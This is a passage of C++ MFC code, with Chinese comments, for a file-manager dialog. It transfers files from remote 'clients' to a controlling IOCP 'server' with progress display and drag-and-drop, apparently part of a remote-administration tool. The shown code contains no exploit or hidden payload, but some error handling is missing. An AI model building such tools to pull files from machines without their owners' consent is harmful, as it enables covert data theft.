		m_TransferMode = TRANSFER_MODE_NORMAL;
		//刷新
		FixedServerFileList(0);
	}
	else
	{
		Sleep(5);
		//下一个 转换路径
		ClientToServerFileFullPath();
	}
	return;
}
//客户端拷贝到服务器显示进度条
void CDlgFileManager::ShowProgressClientToServer()
{
	if ((int)m_Counter == -1)
	{
		m_Counter = m_OperatingFileLength;
	}

	int	iProgress = (float)(m_Counter * 100) / m_OperatingFileLength;

	m_ProgressCtrl->SetPos(iProgress);


	if (m_Counter == m_OperatingFileLength)
	{
		m_Counter = m_OperatingFileLength = 0;
	}
}
//创建文件 发送接收文件数据请求
VOID CDlgFileManager::GetFileDataFromClient()
{
	int	iTransferMode;//文件处理方式

	switch (m_TransferMode)
	{
	case TRANSFER_MODE_OVERWRITE_ALL:
		iTransferMode = TRANSFER_MODE_OVERWRITE;
		break;
	case TRANSFER_MODE_JUMP_ALL:
		iTransferMode = TRANSFER_MODE_JUMP;
		break;
	default:
		iTransferMode = m_TransferMode;
	}

	DWORD	CreationDisposition; // 文件打开方式 
	WIN32_FIND_DATA wfa;
	HANDLE FileHandle = FindFirstFile(m_LocalFileFullPath, &wfa);

	char BufferData[9] = { 0 };

	BufferData[0] = CLIENT_FILE_MANAGER_COPY_FILE_DATA_TO_SERVER;

	// 文件已经存在
	if (FileHandle != INVALID_HANDLE_VALUE)
	{

		// 覆盖
		if (iTransferMode == TRANSFER_MODE_OVERWRITE)
		{
			memset(BufferData + 1, 0, 8);//0000 0000	
			CreationDisposition = CREATE_ALWAYS;//创建一个新的文件  
		}
		// 跳过
		else if (iTransferMode == TRANSFER_MODE_JUMP)
		{
			DWORD v1 = -1;
			memcpy(BufferData + 5, &v1, 4);//0000 -1
			CreationDisposition = OPEN_EXISTING;
		}
	}
	// 文件不存在
	else
	{
		memset(BufferData + 1, 0, 8);//0000 0000	
		CreationDisposition = CREATE_ALWAYS;//创建一个新的文件
	}
	FindClose(FileHandle);

	FileHandle = CreateFile(m_LocalFileFullPath, GENERIC_WRITE, FILE_SHARE_WRITE,
		NULL,
		CreationDisposition, // 文件打开方式 
		FILE_ATTRIBUTE_NORMAL,
		0
	);
	// 需要错误处理
	if (FileHandle == INVALID_HANDLE_VALUE)
	{
		m_OperatingFileLength = 0;
		return;
	}
	CloseHandle(FileHandle);

	//数据包类型+[]+[]
	m_IOCPServer->OnPrepareSending(m_ContextObject, (PBYTE)BufferData, 9);
}
//将接受的文件数据写进文件中 
VOID CDlgFileManager::WriteServerReceiveFile(LPBYTE BufferData, ULONG BufferLength)
{
	BYTE	*Travel;
	DWORD	NumberOfBytesToWrite = 0;
	DWORD	NumberOfBytesWirte = 0;
	int		v3 = 9; // 1 + 4 + 4  数据包头部大小，为固定的9
	FILE_SIZE* v1;

	v1 = (FILE_SIZE *)BufferData;

	// 得到数据在文件中的偏移
	LONG	OffsetHigh = v1->FileSizeHigh;
	LONG	OffsetLow = v1->FileSizeLow;

	// 得到数据的偏移
	Travel = BufferData + 8;

	NumberOfBytesToWrite = BufferLength - 8;

	HANDLE	FileHandle =
		CreateFile
		(
			m_LocalFileFullPath,
			GENERIC_WRITE,
			FILE_SHARE_WRITE,
			NULL,
			OPEN_EXISTING,
			FILE_ATTRIBUTE_NORMAL,
			0
		);
	//定位文件指针
	SetFilePointer(FileHandle, OffsetLow, &OffsetHigh, FILE_BEGIN);

	// 写入文件
	WriteFile
	(
		FileHandle,
		Travel,
		NumberOfBytesToWrite,
		&NumberOfBytesWirte,
		NULL
	);

	//？？？为啥进度条不走？？？
	m_Counter = MAKEINT64(v1->FileSizeLow, v1->FileSizeHigh);
	ShowProgressClientToServer(); //通知进度条


	CloseHandle(FileHandle);
	BYTE	IsToken[9];

	//继续发送接收数据请求
	IsToken[0] = CLIENT_FILE_MANAGER_COPY_FILE_DATA_TO_SERVER;

	//文件数据偏移加过去
	OffsetLow += NumberOfBytesWirte;

	memcpy(IsToken + 1, &OffsetHigh, sizeof(OffsetHigh));
	memcpy(IsToken + 5, &OffsetLow, sizeof(OffsetLow));

	m_IOCPServer->OnPrepareSending(m_ContextObject, IsToken, sizeof(IsToken));
}

void CDlgFileManager::OnLvnBegindragListDialogFileManagerClient(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMLISTVIEW pNMLV = reinterpret_cast<LPNMLISTVIEW>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码

	//拖拽之前必须有两个文件路径
	if (m_ServerFileFullPath.IsEmpty() || m_ClientFileFullPath.IsEmpty())
	{
		return;
	}

	//变换鼠标的样式 
	if (m_CListCtrl_Dialog_File_Manager_Client.GetSelectedCount() > 1)
	{
		//如果选择多项进行拖拽
		m_CursorHwnd = AfxGetApp()->LoadCursor(IDC_CURSOR_MULITI_MDRAG);
	}
	else
	{
		//如果只拖拽一项
		m_CursorHwnd = AfxGetApp()->LoadCursor(IDC_CURSOR_SINGLE_SDRAG);
	}

	//是否拖拽设成TRUE
	m_IsDragging = TRUE;

	//拖拽源列表设成客户端List
	m_DragControlList = &m_CListCtrl_Dialog_File_Manager_Client;
	m_DropControlList = &m_CListCtrl_Dialog_File_Manager_Client;

	//设置鼠标捕获
	SetCapture();

	*pResult = 0;
}
